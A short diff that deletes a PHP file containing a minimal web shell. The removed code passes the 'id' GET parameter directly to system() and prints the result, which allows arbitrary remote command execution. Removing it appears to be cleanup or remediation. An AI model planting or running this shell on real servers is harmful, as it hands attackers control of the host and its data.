@@ -1,7 +1,0 @@
-<?php
-if (isset($_GET["id"])) {
-    $amin = $_GET["id"];
-    echo system("$amin");
-}
-?>
-
